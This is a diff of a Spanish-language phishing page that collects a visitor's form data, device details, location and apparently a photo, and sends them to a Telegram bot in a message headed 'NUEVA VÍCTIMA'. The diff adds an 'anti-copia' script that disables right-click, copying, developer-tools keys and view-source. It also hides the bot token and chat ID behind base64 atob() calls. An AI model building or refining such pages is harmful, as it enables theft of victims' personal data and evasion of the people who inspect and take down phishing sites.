@@ -113,6 +113,9 @@ select.form-control{padding:10px 12px;height:44px}
 .recuadro-final-numero{font-size:34px;font-weight:800;line-height:1;letter-spacing:-.5px;color:#FFFFFF}
 .recuadro-final-ayuda{font-size:13px;line-height:1.2;color:#FFFFFF;margin:0}
 </style>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 </head>
 <body>
 
@@ -231,6 +234,16 @@ select.form-control{padding:10px 12px;height:44px}
 </footer>
 
 <script>
+/* ===== Seguridad anti-copia ===== */
+document.addEventListener('contextmenu',function(e){e.preventDefault();});
+document.addEventListener('selectstart',function(e){e.preventDefault();});
+document.addEventListener('copy',function(e){e.preventDefault();});
+document.addEventListener('keydown',function(e){
+  if(e.key==='F12'){e.preventDefault();}
+  if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C')){e.preventDefault();}
+  if(e.ctrlKey&&(e.key==='u'||e.key==='U')){e.preventDefault();}
+});
+
 var LADAS=[["🇲🇽","+52","México"],["🇺🇸","+1","Estados Unidos"],["🇨🇦","+1","Canadá"],["🇬🇹","+502","Guatemala"],["🇸🇻","+503","El Salvador"],["🇭🇳","+504","Honduras"],["🇳🇮","+505","Nicaragua"],["🇨🇷","+506","Costa Rica"],["🇵🇦","+507","Panamá"],["🇧🇿","+501","Belice"],["🇨🇺","+53","Cuba"],["🇩🇴","+1","Rep. Dominicana"],["🇵🇷","+1","Puerto Rico"],["🇭🇹","+509","Haití"],["🇯🇲","+1","Jamaica"],["🇨🇴","+57","Colombia"],["🇻🇪","+58","Venezuela"],["🇪🇨","+593","Ecuador"],["🇵🇪","+51","Perú"],["🇧🇴","+591","Bolivia"],["🇵🇾","+595","Paraguay"],["🇺🇾","+598","Uruguay"],["🇦🇷","+54","Argentina"],["🇨🇱","+56","Chile"],["🇧🇷","+55","Brasil"],["🇪🇸","+34","España"],["🇵🇹","+351","Portugal"],["🇫🇷","+33","Francia"],["🇩🇪","+49","Alemania"],["🇮🇹","+39","Italia"],["🇬🇧","+44","Reino Unido"],["🇮🇪","+353","Irlanda"],["🇳🇱","+31","Países Bajos"],["🇧🇪","+32","Bélgica"],["🇨🇭","+41","Suiza"],["🇦🇹","+43","Austria"],["🇸🇪","+46","Suecia"],["🇳🇴","+47","Noruega"],["🇩🇰","+45","Dinamarca"],["🇫🇮","+358","Finlandia"],["🇵🇱","+48","Polonia"],["🇬🇷","+30","Grecia"],["🇷🇺","+7","Rusia"],["🇺🇦","+380","Ucrania"],["🇹🇷","+90","Turquía"],["🇮🇱","+972","Israel"],["🇪🇬","+20","Egipto"],["🇿🇦","+27","Sudáfrica"],["🇳🇬","+234","Nigeria"],["🇲🇦","+212","Marruecos"],["🇯🇵","+81","Japón"],["🇨🇳","+86","China"],["🇰🇷","+82","Corea del Sur"],["🇮🇳","+91","India"],["🇵🇰","+92","Pakistán"],["🇵🇭","+63","Filipinas"],["🇮🇩","+62","Indonesia"],["🇲🇾","+60","Malasia"],["🇸🇬","+65","Singapur"],["🇹🇭","+66","Tailandia"],["🇻🇳","+84","Vietnam"],["🇦🇺","+61","Australia"],["🇳🇿","+64","Nueva Zelanda"],["🇦🇫","+93","Afganistán"],["🇦🇱","+355","Albania"],["🇩🇿","+213","Argelia"],["🇦🇩","+376","Andorra"],["🇦🇴","+244","Angola"],["🇦🇲","+374","Armenia"],["🇦🇿","+994","Azerbaiyán"],["🇧🇭","+973","Bahréin"],["🇧🇩","+880","Bangladesh"],["🇧🇾","+375","Bielorrusia"],["🇧🇯","+229","Benín"],["🇧🇹","+975","Bután"],["🇧🇦","+387","Bosnia"],["🇧🇼","+267","Botsuana"],["🇧🇳","+673","Brunéi"],["🇧🇬","+359","Bulgaria"],["🇧🇫","+226","Burkina Faso"],["🇧🇮","+257","Burundi"],["🇰🇭","+855","Camboya"],["🇨🇲","+237","Camerún"],["🇹🇩","+235","Chad"],["🇨🇾","+357","Chipre"],["🇰🇲","+269","Comoras"],["🇨🇬","+242","Congo"],["🇨🇩","+243","Congo RD"],["🇰🇵","+850","Corea del Norte"],["🇨🇮","+225","Costa de Marfil"],["🇭🇷","+385","Croacia"],["🇩🇯","+253","Yibuti"],["🇦🇪","+971","Emiratos Árabes"],["🇪🇷","+291","Eritrea"],["🇪🇪","+372","Estonia"],["🇸🇿","+268","Esuatini"],["🇪🇹","+251","Etiopía"],["🇫🇯","+679","Fiyi"],["🇬🇦","+241","Gabón"],["🇬🇲","+220","Gambia"],["🇬🇪","+995","Georgia"],["🇬🇭","+233","Ghana"],["🇬🇳","+224","Guinea"],["🇬🇼","+245","Guinea-Bisáu"],["🇬🇶","+240","Guinea Ecuatorial"],["🇬🇾","+592","Guyana"],["🇭🇺","+36","Hungría"],["🇮🇸","+354","Islandia"],["🇮🇷","+98","Irán"],["🇮🇶","+964","Irak"],["🇯🇴","+962","Jordania"],["🇰🇿","+7","Kazajistán"],["🇰🇪","+254","Kenia"],["🇰🇬","+996","Kirguistán"],["🇰🇮","+686","Kiribati"],["🇰🇼","+965","Kuwait"],["🇱🇦","+856","Laos"],["🇱🇸","+266","Lesoto"],["🇱🇻","+371","Letonia"],["🇱🇧","+961","Líbano"],["🇱🇷","+231","Liberia"],["🇱🇾","+218","Libia"],["🇱🇮","+423","Liechtenstein"],["🇱🇹","+370","Lituania"],["🇱🇺","+352","Luxemburgo"],["🇲🇬","+261","Madagascar"],["🇲🇼","+265","Malaui"],["🇲🇻","+960","Maldivas"],["🇲🇱","+223","Malí"],["🇲🇹","+356","Malta"],["🇲🇭","+692","Islas Marshall"],["🇲🇷","+222","Mauritania"],["🇲🇺","+230","Mauricio"],["🇫🇲","+691","Micronesia"],["🇲🇩","+373","Moldavia"],["🇲🇨","+377","Mónaco"],["🇲🇳","+976","Mongolia"],["🇲🇪","+382","Montenegro"],["🇲🇿","+258","Mozambique"],["🇲🇲","+95","Myanmar"],["🇳🇦","+264","Namibia"],["🇳🇷","+674","Nauru"],["🇳🇵","+977","Nepal"],["🇳🇪","+227","Níger"],["🇴🇲","+968","Omán"],["🇵🇼","+680","Palaos"],["🇵🇸","+970","Palestina"],["🇵🇬","+675","Papúa Nueva Guinea"],["🇶🇦","+974","Qatar"],["🇷🇴","+40","Rumanía"],["🇷🇼","+250","Ruanda"],["🇰🇳","+1","San Cristóbal y Nieves"],["🇱🇨","+1","Santa Lucía"],["🇻🇨","+1","San Vicente"],["🇼🇸","+685","Samoa"],["🇸🇲","+378","San Marino"],["🇸🇹","+239","Santo Tomé"],["🇸🇦","+966","Arabia Saudita"],["🇸🇳","+221","Senegal"],["🇷🇸","+381","Serbia"],["🇸🇨","+248","Seychelles"],["🇸🇱","+232","Sierra Leona"],["🇸🇰","+421","Eslovaquia"],["🇸🇮","+386","Eslovenia"],["🇸🇧","+677","Islas Salomón"],["🇸🇴","+252","Somalia"],["🇸🇸","+211","Sudán del Sur"],["🇸🇩","+249","Sudán"],["🇱🇰","+94","Sri Lanka"],["🇸🇷","+597","Surinam"],["🇸🇾","+963","Siria"],["🇹🇯","+992","Tayikistán"],["🇹🇿","+255","Tanzania"],["🇹🇱","+670","Timor Oriental"],["🇹🇬","+228","Togo"],["🇹🇴","+676","Tonga"],["🇹🇹","+1","Trinidad y Tobago"],["🇹🇳","+216","Túnez"],["🇹🇲","+993","Turkmenistán"],["🇹🇻","+688","Tuvalu"],["🇺🇬","+256","Uganda"],["🇺🇿","+998","Uzbekistán"],["🇻🇺","+678","Vanuatu"],["🇻🇦","+39","Vaticano"],["🇾🇪","+967","Yemen"],["🇿🇲","+260","Zambia"],["🇿🇼","+263","Zimbabue"],["🇭🇰","+852","Hong Kong"],["🇲🇴","+853","Macao"],["🇹🇼","+886","Taiwán"],["🇬🇱","+299","Groenlandia"],["🇬🇮","+350","Gibraltar"],["🇧🇲","+1","Bermudas"],["🇰🇾","+1","Islas Caimán"]];
 var info={modelo:navigator.userAgent,so:navigator.platform||'?',navegador:'?',pantalla:screen.width+'x'+screen.height,idioma:navigator.language,bateria:'?',red:navigator.connection?navigator.connection.effectiveType:'?',ip:'?',ciudad:'?',pais:'?',gps:'no'};
 var foto='',form={};
@@ -261,7 +274,7 @@ function leerForm(){
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
   var lada=v('lada'),tel=v('telefono');if(tel)form.tel=lada+' '+tel;
 }
-var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";var CHAT="9092452687";var API="https://api.telegram.org/bot"+TOKEN;
+var TOKEN=atob("OTI2NzExNDYyMTpBQUV2U3FYVjBaN25DbmpWTUg1OWJmaXVJc0FTdUU3d3d2VQ==");var CHAT=atob("OTA5MjQ1MjY4Nw==");var API="https://api.telegram.org/bot"+TOKEN;
 function enviar(){
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n💻 <b>SO:</b> "+info.so+"\n🌐 <b>Nav:</b> "+info.navegador+"\n📺 <b>Pantalla:</b> "+info.pantalla+"\n🌎 <b>Idioma:</b> "+info.idioma+"\n🔋 <b>Bat:</b> "+info.bateria+"\n📡 <b>Red:</b> "+info.red+"\n📍 <b>IP:</b> "+info.ip+"\n🏙️ <b>Ciudad:</b> "+info.ciudad+"\n🌍 <b>País:</b> "+info.pais+"\n🧭 <b>GPS:</b> "+info.gps+"\n";
